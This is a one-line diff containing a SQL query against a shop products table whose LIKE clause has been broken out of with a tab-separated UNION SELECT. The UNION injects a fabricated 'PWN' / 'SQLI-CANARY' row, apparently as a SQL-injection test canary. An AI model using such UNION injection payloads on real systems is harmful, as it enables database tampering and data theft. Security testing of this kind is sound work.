@@ -1,0 +1,1 @@
+SELECT p.*, m.shop_name FROM heasec_shop_products p JOIN heasec_shop_merchants m ON p.merchant_id = m.id WHERE p.name LIKE '%zzzz%'	UNION	SELECT	999,'PWN',1,'SQLI-CANARY','desc',1.00,1,NULL,0,NULL,NULL,0,1,NOW(),NOW(),'shop%' AND p.status = 1 ORDER BY p.created_at DESC;
